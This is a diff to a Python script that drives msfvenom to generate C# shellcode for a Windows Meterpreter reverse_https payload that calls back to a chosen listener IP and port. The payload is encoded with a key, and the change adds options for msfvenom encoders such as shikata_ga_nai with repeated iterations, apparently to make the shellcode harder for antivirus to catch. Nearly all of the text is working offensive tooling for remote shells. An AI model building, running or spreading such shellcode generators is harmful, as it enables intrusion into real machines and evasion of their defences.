@@ -20,11 +20,19 @@ parser.add_argument("lhost", help="listener IP to use")
 parser.add_argument("lport", help="listener port to use", nargs='?', default="443")
 parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: windows/x64/meterpreter/reverse_https)", nargs='?', default="windows/x64/meterpreter/reverse_https")
 parser.add_argument("key", help="the key to encode the payload with (integer)", type=auto_int, nargs='?', default=randint(1,255))
+parser.add_argument("--encoder", help="msfvenom encoder (bijv. x86/shikata_ga_nai)", default="")
+parser.add_argument("--iterations", help="encoder iterations", type=int, default=0)
 args = parser.parse_args()
 
 # Generate the shellcode given the preferred payload
 print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
-result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "csharp"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+msf_cmd = ['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread']
+if args.encoder:
+    msf_cmd.extend(["-e", args.encoder])
+    if args.iterations > 0:
+        msf_cmd.extend(["-i", str(args.iterations)])
+msf_cmd.extend(["-f", "csharp"])
+result = subprocess.run(msf_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 if result.returncode != 0:
     print(f"{bcolors.BOLD}{bcolors.FAIL}[x] msfvenom stderr:{bcolors.ENDC}\n{result.stderr.decode('utf-8', errors='replace')}")
